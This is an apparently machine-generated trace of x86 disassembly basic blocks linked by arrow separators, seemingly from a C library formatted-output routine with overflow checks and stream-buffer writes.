0xb05822e:	nop	
0xb058230:	mov	eax, dword ptr [ebp - 0x1044]
0xb058236:	add	edi, dword ptr [ebp - 0x1030]
0xb05823c:	mov	dword ptr [esp], esi
0xb05823f:	mov	dword ptr [esp + 0xc], eax
0xb058243:	mov	eax, dword ptr [ebp - 0x103c]
0xb058249:	mov	dword ptr [esp + 8], edi
0xb05824d:	mov	dword ptr [esp + 4], eax
0xb058251:	call	0xb062da0
None
|
|
|
v
0xb05b1e3:	lea	ecx, dword ptr [edx + 4]
0xb05b1e6:	mov	dword ptr [eax + 0x10], ecx
0xb05b1e9:	mov	dword ptr [edx], 0x20
0xb05b1ef:	jmp	0xb0598fc
None
|
|
|
v
0xb0593e5:	cmp	eax, 1
0xb0593e8:	je	0xb059390
None
|
|
|
v
0xb059321:	mov	ecx, dword ptr [ebp - 0x103c]
0xb059327:	xor	edi, edi
0xb059329:	mov	edx, dword ptr [ebp - 0x1060]
0xb05932f:	lea	eax, dword ptr [ecx + ecx*2]
0xb059332:	lea	eax, dword ptr [edx + eax*4]
0xb059335:	mov	edx, eax
0xb059337:	mov	dword ptr [ebp - 0x1040], eax
0xb05933d:	mov	eax, ecx
0xb05933f:	mov	ecx, edx
0xb059341:	shl	eax, 2
0xb059344:	add	ecx, eax
0xb059346:	mov	dword ptr [esp + 8], eax
0xb05934a:	mov	eax, dword ptr [ebp + 8]
0xb05934d:	mov	dword ptr [ebp - 0x1038], ecx
0xb059353:	mov	eax, dword ptr [eax + 0x3c]
0xb059356:	mov	dword ptr [esp], ecx
0xb059359:	shl	eax, 0x1d
0xb05935c:	sar	eax, 0x1f
0xb05935f:	mov	dword ptr [esp + 4], eax
0xb059363:	call	0xb07ca20
None
|
|
|
v
0xb05b541:	mov	eax, 0x7fffffff
0xb05b546:	sub	eax, dword ptr [ebp - 0x101c]
0xb05b54c:	cmp	edi, eax
0xb05b54e:	ja	0xb058740
None
|
|
|
v
0xb05adda:	mov	eax, dword ptr [ebp - 0x1024]
0xb05ade0:	mov	ecx, dword ptr [ebx - 0xdc]
0xb05ade6:	mov	dword ptr [ebp - 0x1038], 0
0xb05adf0:	mov	dword ptr [eax + ecx], 0x4b
0xb05adf7:	jmp	0xb0571e6
None
|
|
|
v
0xb059250:	cmp	edi, 0x7fffffff
0xb059256:	je	0xb0571e6
None
|
|
|
v
0xb058974:	cmp	dword ptr [ebp - 0x1044], 8
0xb05897b:	jne	0xb059ed2
None
|
|
|
v
0xb056ca5:	cmp	eax, 1
0xb056ca8:	jne	0xb057038
None
|
|
|
v
0xb059985:	mov	edx, dword ptr [eax + 0x10]
0xb059988:	cmp	edx, dword ptr [eax + 0x14]
0xb05998b:	jae	0xb05aebb
None
|
|
|
v
0xb05ae30:	mov	ecx, dword ptr [ebp - 0x1040]
0xb05ae36:	mov	dword ptr [ebp - 0x1030], ecx
0xb05ae3c:	movzx	ecx, byte ptr [ebp - 0x1049]
0xb05ae43:	test	eax, eax
0xb05ae45:	mov	eax, 1
0xb05ae4a:	cmove	ecx, eax
0xb05ae4d:	mov	byte ptr [ebp - 0x1049], cl
0xb05ae53:	jmp	0xb058230
None
|
|
|
v
0xb0583ef:	mov	edx, 0x7fffffff
0xb0583f4:	sub	edx, dword ptr [ebp - 0x101c]
0xb0583fa:	add	dword ptr [ebp - 0x1054], 1
0xb058401:	add	dword ptr [ebp - 0x101c], eax
0xb058407:	cmp	eax, edx
0xb058409:	jg	0xb058740
None
|
|
|
v
0xb059e3c:	mov	esi, eax
0xb059e3e:	push	edx
0xb059e3f:	jmp	0xb059db4
None
|
|
|
v
0xb059977:	mov	eax, dword ptr [ebp + 8]
0xb05997a:	mov	eax, dword ptr [eax + 0x58]
0xb05997d:	test	eax, eax
0xb05997f:	je	0xb05aebb
None
|
|
|
v
0xb05b3ee:	mov	dword ptr [ebp - 0x103c], 1
0xb05b3f8:	jmp	0xb058d51
None
|
|
|
v
0xb058de5:	mov	eax, 0x7fffffff
0xb058dea:	sub	eax, ecx
0xb058dec:	add	dword ptr [ebp - 0x101c], edx
0xb058df2:	cmp	edx, eax
0xb058df4:	ja	0xb058740
None
|
|
|
v
0xb058ec7:	mov	dword ptr [esp], esi
0xb058eca:	call	0xb017470
None
|
|
|
v
0xb0586f7:	mov	eax, dword ptr [ebp + 8]
0xb0586fa:	mov	ecx, dword ptr [ebp + 8]
0xb0586fd:	mov	edi, dword ptr [ebp - 0x10b8]
0xb058703:	movsx	eax, byte ptr [eax + 0x46]
0xb058707:	sar	edi, 2
0xb05870a:	mov	eax, dword ptr [ecx + eax + 0x94]
0xb058711:	mov	dword ptr [esp + 8], edi
0xb058715:	mov	dword ptr [esp + 4], esi
0xb058719:	mov	dword ptr [esp], ecx
0xb05871c:	call	dword ptr [eax + 0x1c]
None
|
|
|
v
0xb056fcc:	jmp	0xb056dfc
None
|
|
|
v
0xb05b409:	not	ecx
0xb05b40b:	lea	eax, dword ptr [ecx - 1]
0xb05b40e:	mov	dword ptr [ebp - 0x1040], eax
0xb05b414:	jmp	0xb058d0f
None
|
|
|
v
0xb05a7b7:	mov	dword ptr [ebp - 0x10b8], 0
0xb05a7c1:	lea	esi, dword ptr [ebx - 0x41a2c]
0xb05a7c7:	jmp	0xb058cce
None
|
|
|
v
0xb056e28:	mov	dword ptr [esp + 4], 1
0xb056e30:	mov	dword ptr [esp], eax
0xb056e33:	call	0xb066ae0
None
|
|
|
v
0xb056f91:	lock sub	dword ptr [edx], 1
None
|
|
|
v
0xb0597f3:	test	eax, eax
0xb0597f5:	js	0xb0571e6
None
|
|
|
v
0xb05ad8c:	mov	eax, dword ptr [ebp + 8]
0xb05ad8f:	mov	dword ptr [esp + 4], ecx
0xb05ad93:	mov	dword ptr [esp], eax
0xb05ad96:	call	0xb06a320
None
|
|
|
v
0xb058e2c:	mov	edx, dword ptr [ebp - 0x1040]
0xb058e32:	cmp	edi, eax
0xb058e34:	jne	0xb0571e6
None
|
|
|
v
0xb058d8d:	mov	edx, dword ptr [ebp - 0x1048]
0xb058d93:	sub	edx, edi
0xb058d95:	js	0xb05b419
None
|
|
|
v
0xb05ae77:	test	eax, eax
0xb05ae79:	jne	0xb059716
None
|
|
|
v
0xb05af0d:	jmp	0xb0581dd
None
|
|
|
v
0xb059368:	mov	eax, dword ptr [ebp - 0x1034]
0xb05936e:	mov	esi, dword ptr [ebp - 0x1030]
0xb059374:	mov	ecx, dword ptr [ebp - 0x1038]
0xb05937a:	test	eax, eax
0xb05937c:	je	0xb059438
None
|
|
|
v
0xb05a04c:	lea	ecx, dword ptr [edx + 4]
0xb05a04f:	mov	dword ptr [eax + 0x10], ecx
0xb05a052:	mov	dword ptr [edx], 0x2b
0xb05a058:	jmp	0xb0598fc
None
|
|
|
v
0xb05ae22:	mov	eax, dword ptr [ebp - 0x1038]
0xb05ae28:	mov	dword ptr [esp], eax
0xb05ae2b:	call	0xb0f8ac0
None
|
|
|
v
0xb059568:	test	ah, 8
0xb05956b:	jne	0xb059518
None
|
|
|
v
0xb057004:	mov	eax, dword ptr [ebp + 8]
0xb057007:	mov	eax, dword ptr [eax]
0xb057009:	test	ah, 0x80
0xb05700c:	mov	dword ptr [ebp - 0x101c], eax
0xb057012:	je	0xb056d46
None
|
|
|
v
0xb05b1b7:	jmp	0xb0571e6
None
|
|
|
v
0xb0597ee:	cmp	eax, 0xfe
0xb0597f1:	je	0xb059830
None
|
|
|
v
0xb059dc1:	test	byte ptr [ebp - 0x10c8], 1
0xb059dc8:	je	0xb0584fe
None
|
|
|
v
0xb058d09:	mov	dword ptr [ebp - 0x1040], eax
0xb058d0f:	cmp	dword ptr [ebp - 0x1040], 0x3fffffff
0xb058d19:	ja	0xb058740
None
|
|
|
v
0xb059f73:	mov	eax, dword ptr [ebp + 8]
0xb059f76:	mov	eax, dword ptr [eax + 0x58]
0xb059f79:	test	eax, eax
0xb059f7b:	je	0xb05afea
None
|
|
|
v
0xb058cfd:	mov	dword ptr [esp + 4], eax
0xb058d01:	mov	dword ptr [esp], esi
0xb058d04:	call	0xb017480
None
|
|
|
v
0xb0595c5:	mov	dword ptr [ebp - 0x1050], 0
0xb0595cf:	jmp	0xb0581ea
None
|
|
|
v
0xb05bb5c:	lea	eax, dword ptr [edx]
0xb05bb5e:	call	0xb0f9460
None
|
|
|
v
0xb05b4f1:	mov	dword ptr [esp], ecx
0xb05b4f4:	mov	dword ptr [ebp - 0x1038], ecx
0xb05b4fa:	call	0xb0173f0
None
|
|
|
v
0xb0595bd:	test	al, al
0xb0595bf:	jne	0xb0581ea
None
|
|
|
v
0xb059d8b:	cmp	edx, 0x10
0xb059d8e:	je	0xb059e03
None
|
|
|
v
0xb058276:	imul	edi, dword ptr [ebp - 0x1034], 0x34
0xb05827d:	mov	eax, dword ptr [ebp - 0x1038]
0xb058283:	cmp	eax, edi
0xb058285:	ja	0xb058230
None
|
|
|
v
0xb05ad74:	lea	eax, dword ptr [ebx - 0x4a72d]
0xb05ad7a:	mov	dword ptr [esp + 4], eax
0xb05ad7e:	lea	eax, dword ptr [ebx - 0x45d60]
0xb05ad84:	mov	dword ptr [esp], eax
0xb05ad87:	call	0xb027820
None
|
|
|
v
0xb056dbc:	cmp	edi, eax
0xb056dbe:	je	0xb056e50
None
|
|
|
v
0xb0596cb:	mov	ecx, dword ptr [ebp - 0x1060]
0xb0596d1:	lea	eax, dword ptr [eax + eax*2]
0xb0596d4:	mov	eax, dword ptr [ecx + eax*4]
0xb0596d7:	test	eax, eax
0xb0596d9:	js	0xb0598b4
None
|
|
|
v
0xb05ada9:	mov	dword ptr [esp], edi
0xb05adac:	lea	esi, dword ptr [esi]
0xb05adb0:	call	0xb0f8ac0
None
|
|
|
v
0xb058d1f:	mov	eax, dword ptr [ebp - 0x1040]
0xb058d25:	lea	esi, dword ptr [eax*4]
0xb058d2c:	cmp	esi, 0x1000
0xb058d32:	ja	0xb05b3cc
None
|
|
|
v
0xb058256:	mov	esi, dword ptr [edi + 0x18]
0xb058259:	add	dword ptr [ebp - 0x1034], 1
0xb058260:	add	dword ptr [ebp - 0x103c], eax
0xb058266:	mov	eax, dword ptr [esi]
0xb058268:	mov	dword ptr [ebp - 0x1018], esi
0xb05826e:	test	eax, eax
0xb058270:	je	0xb0592d0
None
|
|
|
v
0xb0585da:	lea	ecx, dword ptr [edx + 4]
0xb0585dd:	mov	dword ptr [eax + 0x10], ecx
0xb0585e0:	mov	dword ptr [edx], 0x2d
0xb0585e6:	cmp	dword ptr [ebp - 0x101c], 0x7fffffff
0xb0585f0:	je	0xb0571e6
None
|
|
|
v
0xb05a92c:	lea	eax, dword ptr [ebx - 0x4a72d]
0xb05a932:	mov	dword ptr [esp + 4], eax
0xb05a936:	lea	eax, dword ptr [ebx - 0x45d30]
0xb05a93c:	mov	dword ptr [esp], eax
0xb05a93f:	call	0xb027820
None
|
|
|
v
0xb0592b8:	mov	eax, dword ptr [ebp - 0x1030]
0xb0592be:	mov	dword ptr [esp], eax
0xb0592c1:	call	0xb017470
None
|
|
|
v
0xb0596ba:	mov	dword ptr [esi + 4], edx
0xb0596bd:	mov	dword ptr [ebp - 0x1048], edx
0xb0596c3:	mov	eax, dword ptr [esi + 0x1c]
0xb0596c6:	cmp	eax, 0xff
0xb0596c9:	je	0xb0596e7
None
|
|
|
v
0xb05b02a:	lea	ecx, dword ptr [edx + 4]
0xb05b02d:	mov	dword ptr [eax + 0x10], ecx
0xb05b030:	mov	dword ptr [edx], 0x20
0xb05b036:	jmp	0xb0585e6
None
|
|
|
v
0xb0599c6:	mov	ecx, dword ptr [ebp - 0x1040]
0xb0599cc:	test	ecx, ecx
0xb0599ce:	je	0xb059a1c
None
|
|
|
v
0xb05954a:	mov	eax, dword ptr [ebp - 0x1014]
0xb059550:	lea	edx, dword ptr [eax + 8]
0xb059553:	mov	dword ptr [ebp - 0x1014], edx
0xb059559:	mov	edx, dword ptr [eax + 4]
0xb05955c:	mov	eax, dword ptr [eax]
0xb05955e:	mov	dword ptr [edi + 4], edx
0xb059561:	mov	dword ptr [edi], eax
0xb059563:	jmp	0xb059500
None
|
|
|
v
0xb056e41:	mov	eax, dword ptr [ebp + 8]
0xb056e44:	mov	esi, dword ptr [eax]
0xb056e46:	jmp	0xb056cd7
None
|
|
|
v
0xb05980b:	mov	edx, 0x7fffffff
0xb059810:	sub	edx, dword ptr [ebp - 0x101c]
0xb059816:	add	dword ptr [ebp - 0x101c], eax
0xb05981c:	cmp	eax, edx
0xb05981e:	jbe	0xb058383
None
|
|
|
v
0xb0586ea:	cmp	dword ptr [ebp - 0x101c], 0
0xb0586f1:	js	0xb05a91a
None
|
|
|
v
0xb05b1c9:	mov	eax, dword ptr [ebp + 8]
0xb05b1cc:	mov	eax, dword ptr [eax + 0x58]
0xb05b1cf:	test	eax, eax
0xb05b1d1:	je	0xb05b452
None
|
|
|
v
0xb05a032:	mov	eax, dword ptr [ebp + 8]
0xb05a035:	mov	eax, dword ptr [eax + 0x58]
0xb05a038:	test	eax, eax
0xb05a03a:	je	0xb05b19b
None
|
|
|
v
0xb05abe9:	cmp	dword ptr [edx + eax*4 - 0x20], 0
0xb05abee:	je	0xb05957b
None
|
|
|
v
0xb058687:	cmp	dword ptr [ebp - 0x101c], 0x7ffffffe
0xb058691:	je	0xb0571e6
None
|
|
|
v
0xb0594c8:	cmp	eax, 0x100
0xb0594cd:	je	0xb05954a
None
|
|
|
v
0xb0596e7:	mov	eax, dword ptr [ebp - 0x1048]
0xb0596ed:	mov	ecx, dword ptr [ebp - 0x1040]
0xb0596f3:	cmp	ecx, eax
0xb0596f5:	cmovge	eax, ecx
0xb0596f8:	cmp	eax, 0x3c8
0xb0596fd:	jle	0xb059870
None
|
|
|
v
0xb05a7ad:	mov	dword ptr [ebp - 0x1040], 5
0xb05a7b7:	mov	dword ptr [ebp - 0x10b8], 0
0xb05a7c1:	lea	esi, dword ptr [ebx - 0x41a2c]
0xb05a7c7:	jmp	0xb058cce
None
|
|
|
v
0xb0592c6:	jmp	0xb058309
None
|
|
|
v
0xb05890f:	mov	dword ptr [ebp - 0x103c], eax
0xb058915:	mov	dword ptr [ebp - 0x10a0], 0x78
0xb05891f:	mov	dword ptr [ebp - 0x10c4], 0
0xb058929:	mov	dword ptr [ebp - 0x10b4], 1
0xb058933:	mov	dword ptr [ebp - 0x1044], 0x10
0xb05893d:	mov	dword ptr [ebp - 0x10a4], 0
0xb058947:	cmp	dword ptr [ebp - 0x1040], 0
0xb05894e:	js	0xb059e6c
None
|
|
|
v
0xb05871f:	cmp	edi, eax
0xb058721:	jne	0xb0571e6
None
|
|
|
v
0xb05aebb:	mov	eax, dword ptr [ebp - 0x10a0]
0xb05aec1:	mov	dword ptr [esp + 4], eax
0xb05aec5:	mov	eax, dword ptr [ebp + 8]
0xb05aec8:	mov	dword ptr [esp], eax
0xb05aecb:	call	0xb06a320
None
|
|
|
v
0xb056dc4:	mov	dword ptr [ebp - 0x101c], 0xffffffff
0xb056dce:	mov	eax, dword ptr [ebp + 8]
0xb056dd1:	mov	eax, dword ptr [eax]
0xb056dd3:	test	ah, 0x80
0xb056dd6:	mov	dword ptr [ebp - 0x1024], eax
0xb056ddc:	jne	0xb056dee
None
|
|
|
v
0xb056e7c:	mov	edx, dword ptr [ebx + 0xecc]
0xb056e82:	test	edx, edx
0xb056e84:	jne	0xb05816f
None
|
|
|
v
0xb059a1c:	cmp	dword ptr [ebp - 0x101c], 0
0xb059a23:	js	0xb05a91a
None
|
|
|
v
0xb056d58:	xor	eax, eax
0xb056d5a:	mov	ecx, 1
0xb056d5f:	cmp	dword ptr gs:[0xc], 0
0xb056d67:	je	0xb056d6a
None
|
|
|
v
0xb05b861:	mov	dword ptr [esp], esi
0xb05b864:	call	0xb017400
None
|
|
|
v
0xb05b006:	jmp	0xb0571e6
None
|
|
|
v
0xb05a944:	mov	ecx, dword ptr [ebp + 0x10]
0xb05a947:	mov	eax, dword ptr [ebp + 0x10]
0xb05a94a:	add	ecx, 4
0xb05a94d:	mov	eax, dword ptr [eax]
0xb05a94f:	mov	dword ptr [ebp + 0x10], ecx
0xb05a952:	jmp	0xb058907
None
|
|
|
v
0xb059290:	or	esi, 0x20
0xb059293:	mov	ecx, dword ptr [ebx - 0xdc]
0xb059299:	mov	dword ptr [eax], esi
0xb05929b:	mov	eax, dword ptr [ebp - 0x1024]
0xb0592a1:	mov	dword ptr [eax + ecx], 9
0xb0592a8:	mov	eax, 0xffffffff
0xb0592ad:	jmp	0xb056e02
None
|
|
|
v
0xb0592f2:	mov	eax, dword ptr [ebp - 0x103c]
0xb0592f8:	lea	edi, dword ptr [eax + eax*4]
0xb0592fb:	shl	edi, 2
0xb0592fe:	cmp	edi, 0x1000
0xb059304:	mov	esi, edi
0xb059306:	ja	0xb05ada9
None
|
|
|
v
0xb0598e4:	mov	edx, dword ptr [eax + 0x10]
0xb0598e7:	cmp	edx, dword ptr [eax + 0x14]
0xb0598ea:	jae	0xb05b881
None
|
|
|
v
0xb05ad54:	add	eax, 1
0xb05ad57:	jne	0xb059250
None
|
|
|
v
0xb056e60:	mov	edi, dword ptr [ebx + 0x3768]
0xb056e66:	test	edi, edi
0xb056e68:	jne	0xb05816f
None
|
|
|
v
0xb059e19:	jmp	0xb059dab
None
|
|
|
v
0xb058e68:	mov	eax, dword ptr [ebp + 8]
0xb058e6b:	mov	dword ptr [esp + 8], edx
0xb058e6f:	mov	dword ptr [esp + 4], 0x20
0xb058e77:	mov	dword ptr [ebp - 0x1040], edx
0xb058e7d:	mov	dword ptr [esp], eax
0xb058e80:	call	0xb0699f0
None
|
|
|
v
0xb058eba:	cmp	dword ptr [ebp - 0x103c], 0
0xb058ec1:	je	0xb058383
None
|
|
|
v
0xb058e0d:	mov	eax, dword ptr [ebp + 8]
0xb058e10:	mov	ecx, dword ptr [ebp + 8]
0xb058e13:	movsx	eax, byte ptr [eax + 0x46]
0xb058e17:	mov	eax, dword ptr [ecx + eax + 0x94]
0xb058e1e:	mov	dword ptr [esp + 8], edi
0xb058e22:	mov	dword ptr [esp + 4], esi
0xb058e26:	mov	dword ptr [esp], ecx
0xb058e29:	call	dword ptr [eax + 0x1c]
None
|
|
|
v
0xb059518:	mov	eax, dword ptr [ebp - 0x1014]
0xb05951e:	lea	edx, dword ptr [eax + 4]
0xb059521:	mov	dword ptr [ebp - 0x1014], edx
0xb059527:	mov	eax, dword ptr [eax]
0xb059529:	mov	dword ptr [edi], eax
0xb05952b:	jmp	0xb059500
None
|
|
|
v
0xb05ae7f:	mov	dword ptr [esp], edi
0xb05ae82:	call	0xb0173f0
None
|
|
|
v
0xb05990c:	add	dword ptr [ebp - 0x101c], 1
0xb059913:	sub	dword ptr [ebp - 0x1048], 1
0xb05991a:	cmp	dword ptr [ebp - 0x103c], 0
0xb059921:	je	0xb0599c6
None
|
|
|
v
0xb059927:	cmp	dword ptr [ebp - 0x10b4], 0
0xb05992e:	je	0xb0599c6
None
|
|
|
v
0xb0599d0:	mov	edx, dword ptr [ebp + 8]
0xb0599d3:	mov	dword ptr [esp + 8], ecx
0xb0599d7:	mov	dword ptr [esp + 4], 0x30
0xb0599df:	mov	dword ptr [esp], edx
0xb0599e2:	call	0xb0699f0
None
|
|
|
v
0xb056c60:	push	ebp
0xb056c61:	mov	eax, dword ptr gs:[0]
0xb056c67:	mov	ebp, esp
0xb056c69:	push	edi
0xb056c6a:	push	esi
0xb056c6b:	push	ebx
0xb056c6c:	call	0xb1267db
None
|
|
|
v
0xb0596a6:	mov	ecx, dword ptr [ebp - 0x1060]
0xb0596ac:	lea	edx, dword ptr [edx + edx*2]
0xb0596af:	mov	edx, dword ptr [ecx + edx*4]
0xb0596b2:	test	edx, edx
0xb0596b4:	js	0xb059894
None
|
|
|
v
0xb0581ea:	mov	eax, dword ptr [ebp - 0x1028]
0xb0581f0:	mov	esi, dword ptr [eax]
0xb0581f2:	mov	dword ptr [ebp - 0x1018], eax
0xb0581f8:	test	esi, esi
0xb0581fa:	je	0xb059857
None
|
|
|
v
0xb058620:	mov	eax, dword ptr [ebp + 8]
0xb058623:	mov	eax, dword ptr [eax + 0x58]
0xb058626:	test	eax, eax
0xb058628:	je	0xb05b03b
None
|
|
|
v
0xb059512:	jmp	0xb05840f
None
|
|
|
v
0xb05925f:	cmp	dword ptr [ebp - 0x101c], 0x7ffffffe
0xb059269:	ja	0xb05ad62
None
|
|
|
v
0xb05b44d:	jmp	0xb05926f
None
|
|
|
v
0xb059dce:	mov	eax, esi
0xb059dd0:	mov	edx, edi
0xb059dd2:	mov	dword ptr [esp], edi
0xb059dd5:	call	0xb017bde
None
|
|
|
v
0xb0599b8:	add	dword ptr [ebp - 0x101c], 2
0xb0599bf:	sub	dword ptr [ebp - 0x1048], 2
0xb0599c6:	mov	ecx, dword ptr [ebp - 0x1040]
0xb0599cc:	test	ecx, ecx
0xb0599ce:	je	0xb059a1c
None
|
|
|
v
0xb059cf9:	mov	eax, dword ptr [ebp - 0x105c]
0xb059cff:	mov	dword ptr [esp], eax
0xb059d02:	call	0xb017470
None
|
|
|
v
0xb056dfc:	mov	eax, dword ptr [ebp - 0x101c]
0xb056e02:	lea	esp, dword ptr [ebp - 0xc]
0xb056e05:	pop	ebx
0xb056e06:	pop	esi
0xb056e07:	pop	edi
0xb056e08:	pop	ebp
0xb056e09:	ret	
None
|
|
|
v
0xb05aea9:	lea	edi, dword ptr [eax*4 + 0x80]
0xb05aeb0:	add	edi, dword ptr [ebp - 0x1038]
0xb05aeb6:	jmp	0xb059750
None
|
|
|
v
0xb05b1f4:	lea	eax, dword ptr [ebx - 0x4a558]
0xb05b1fa:	mov	dword ptr [esp + 0xc], eax
0xb05b1fe:	mov	dword ptr [esp + 8], 0x7ff
0xb05b206:	jmp	0xb05a92c
None
|
|
|
v
0xb0584fe:	mov	eax, edi
0xb058500:	sub	eax, esi
0xb058502:	sar	eax, 2
0xb058505:	cmp	dword ptr [ebp - 0x1040], eax
0xb05850b:	jg	0xb058532
None
|
|
|
v
0xb05aed0:	add	eax, 1
0xb05aed3:	jne	0xb0599a8
None
|
|
|
v
0xb059894:	neg	edx
0xb059896:	or	eax, 0x20
0xb059899:	mov	dword ptr [esi + 4], edx
0xb05989c:	mov	byte ptr [esi + 0xc], al
0xb05989f:	mov	dword ptr [ebp - 0x1048], edx
0xb0598a5:	mov	dword ptr [ebp - 0x10b0], 1
0xb0598af:	jmp	0xb0596c3
None
|
|
|
v
0xb0581dd:	cmp	dword ptr [ebp - 0x1050], -1
0xb0581e4:	je	0xb059592
None
|
|
|
v
0xb05850d:	cmp	dword ptr [ebp - 0x103c], 0
0xb058514:	je	0xb058532
None
|
|
|
v
0xb05991a:	cmp	dword ptr [ebp - 0x103c], 0
0xb059921:	je	0xb0599c6
None
|
|
|
v
0xb05bb50:	lea	ecx, dword ptr [edx]
0xb05bb52:	call	0xb0f9430
None
|
|
|
v
0xb0591ea:	lea	esi, dword ptr [edx + 4]
0xb0591ed:	mov	dword ptr [eax + 0x10], esi
0xb0591f0:	mov	dword ptr [edx], ecx
0xb0591f2:	add	ecx, 1
0xb0591f5:	je	0xb0571e6
None
|
|
|
v
0xb05ada4:	jmp	0xb0571e6
None
|
|
|
v
0xb058697:	add	dword ptr [ebp - 0x101c], 2
0xb05869e:	add	edi, dword ptr [ebp - 0x1040]
0xb0586a4:	test	edi, edi
0xb0586a6:	jle	0xb0586ea
None
|
|
|
v
0xb05869e:	add	edi, dword ptr [ebp - 0x1040]
0xb0586a4:	test	edi, edi
0xb0586a6:	jle	0xb0586ea
None
|
|
|
v
0xb0585b3:	cmp	dword ptr [ebp - 0x10a4], 0
0xb0585ba:	je	0xb059f66
None
|
|
|
v
0xb059882:	lea	esi, dword ptr [ebx - 0x152616]
0xb059888:	lea	eax, dword ptr [ebx - 0x1520c8]
0xb05988e:	sub	eax, esi
0xb059890:	add	eax, esi
0xb059892:	jmp	eax
None
|
|
|
v
0xb059aab:	cmp	edi, eax
0xb059aad:	jne	0xb0571e6
None
|
|
|
v
0xb059ac4:	sub	esi, eax
0xb059ac6:	add	dword ptr [ebp - 0x101c], edi
0xb059acc:	cmp	edi, esi
0xb059ace:	jbe	0xb058383
None
|
|
|
v
0xb059233:	mov	edx, dword ptr [eax + 0x10]
0xb059236:	cmp	edx, dword ptr [eax + 0x14]
0xb059239:	jae	0xb05ad45
None
|
|
|
v
0xb056ee9:	mov	dword ptr [ebp - 0x1038], 0
0xb056ef3:	lea	edi, dword ptr [ebp - 0x18]
0xb056ef6:	mov	dword ptr [ebp - 0x108c], 0
0xb056f00:	mov	dword ptr [ebp - 0x1088], 0
0xb056f0a:	mov	dword ptr [ebp - 0x1078], 0
0xb056f14:	mov	dword ptr [ebp - 0x1084], 0
0xb056f1e:	mov	dword ptr [ebp - 0x1094], 0
0xb056f28:	mov	dword ptr [ebp - 0x1080], 0
0xb056f32:	mov	dword ptr [ebp - 0x1090], 0
0xb056f3c:	mov	dword ptr [ebp - 0x107c], 0
0xb056f46:	mov	dword ptr [ebp - 0x1098], 0
0xb056f50:	mov	dword ptr [ebp - 0x1070], 0
0xb056f5a:	mov	dword ptr [ebp - 0x106c], 0xffffffff
0xb056f64:	mov	dword ptr [ebp - 0x109c], 0
0xb056f6e:	mov	dword ptr [ebp - 0x1074], 0x20
0xb056f78:	jmp	eax
None
|
|
|
v
0xb056f9b:	mov	ecx, dword ptr [ebp - 0x1020]
0xb056fa1:	test	ecx, ecx
0xb056fa3:	je	0xb056dfc
None
|
|
|
v
0xb058670:	lea	ecx, dword ptr [edx + 4]
0xb058673:	mov	dword ptr [eax + 0x10], ecx
0xb058676:	mov	eax, dword ptr [ebp - 0x10a0]
0xb05867c:	mov	dword ptr [edx], eax
0xb05867e:	add	eax, 1
0xb058681:	je	0xb0571e6
None
|
|
|
v
0xb05b06d:	mov	eax, dword ptr [ebp + 8]
0xb05b070:	mov	dword ptr [esp + 4], 0x20
0xb05b078:	mov	dword ptr [esp], eax
0xb05b07b:	call	0xb06a320
None
|
|
|
v
0xb059830:	mov	eax, dword ptr [ebp - 0x10a0]
0xb059836:	sub	eax, 0x20
0xb059839:	cmp	eax, 0x5a
0xb05983c:	ja	0xb059882
None
|
|
|
v
0xb056e38:	cmp	eax, 1
0xb056e3b:	jne	0xb057038
None
|
|
|
v
0xb056cbf:	mov	ecx, dword ptr [ebp + 0xc]
0xb056cc2:	test	ecx, ecx
0xb056cc4:	je	0xb057020
None
|
|
|
v
0xb05860a:	cmp	dword ptr [ebp - 0x10b4], 0
0xb058611:	je	0xb05869e
None
|
|
|
v
0xb056fa9:	lea	edx, dword ptr [ebp - 0xff8]
0xb056faf:	mov	eax, dword ptr [ebx + 0x38bc]
0xb056fb5:	mov	dword ptr [esp + 4], 0
0xb056fbd:	ror	eax, 9
0xb056fc0:	xor	eax, dword ptr gs:[0x18]
0xb056fc7:	mov	dword ptr [esp], edx
0xb056fca:	call	eax
None
|
|
|
v
0xb0591fb:	cmp	edi, 0x7fffffff
0xb059201:	je	0xb0571e6
None
|
|
|
v
0xb05adb5:	test	eax, eax
0xb05adb7:	jne	0xb05930c
None
|
|
|
v
0xb059e24:	mov	eax, dword ptr [ebp - 0x1058]
0xb059e2a:	mov	edx, edi
0xb059e2c:	mov	ecx, dword ptr [ebp - 0x1050]
0xb059e32:	mov	dword ptr [esp], eax
0xb059e35:	mov	eax, esi
0xb059e37:	call	0xb017b0c
None
|
|
|
v
0xb056cd7:	test	esi, 2
0xb056cdd:	jne	0xb056e10
None
|
|
|
v
0xb0593ea:	mov	edx, dword ptr [esi + 0x24]
0xb0593ed:	mov	dword ptr [ebp - 0x1048], eax
0xb0593f3:	mov	eax, dword ptr [ebp - 0x1040]
0xb0593f9:	mov	edi, dword ptr [esi + 8]
0xb0593fc:	mov	dword ptr [ebp - 0x1044], ecx
0xb059402:	shl	edx, 2
0xb059405:	add	eax, edx
0xb059407:	add	edx, ecx
0xb059409:	mov	dword ptr [esp + 0xc], eax
0xb05940d:	mov	eax, dword ptr [ebp - 0x1048]
0xb059413:	mov	dword ptr [esp + 8], edx
0xb059417:	mov	dword ptr [esp], esi
0xb05941a:	mov	dword ptr [esp + 4], eax
0xb05941e:	mov	eax, dword ptr [ebx + 0xec8]
0xb059424:	call	dword ptr [eax + edi*4]
None
|
|
|
v
0xb057231:	jmp	0xb056dce
None
|
|
|
v
0xb05862e:	mov	edx, dword ptr [eax + 0x10]
0xb058631:	cmp	edx, dword ptr [eax + 0x14]
0xb058634:	jae	0xb05b03b
None
|
|
|
v
0xb059857:	mov	dword ptr [ebp - 0x103c], 0
0xb059861:	mov	dword ptr [ebp - 0x1034], 0
0xb05986b:	jmp	0xb05930c
None
|
|
|
v
0xb0594df:	cmp	eax, 0x107
0xb0594e4:	jne	0xb059568
None
|
|
|
v
0xb059a07:	mov	eax, 0x7fffffff
0xb059a0c:	sub	eax, edx
0xb059a0e:	add	dword ptr [ebp - 0x101c], ecx
0xb059a14:	cmp	ecx, eax
0xb059a16:	ja	0xb058740
None
|
|
|
v
0xb05851f:	cmp	dword ptr [ebp - 0x1044], 8
0xb058526:	jne	0xb058532
None
|
|
|
v
0xb05b426:	mov	eax, dword ptr [ebp + 8]
0xb05b429:	mov	ecx, dword ptr [ebp + 8]
0xb05b42c:	movsx	eax, byte ptr [eax + 0x46]
0xb05b430:	mov	eax, dword ptr [ecx + eax + 0x94]
0xb05b437:	mov	dword ptr [esp + 8], edi
0xb05b43b:	mov	dword ptr [esp + 4], esi
0xb05b43f:	mov	dword ptr [esp], ecx
0xb05b442:	call	dword ptr [eax + 0x1c]
None
|
|
|
v
0xb059ded:	mov	edx, eax
0xb059def:	sub	esi, 4
0xb059df2:	and	edx, 7
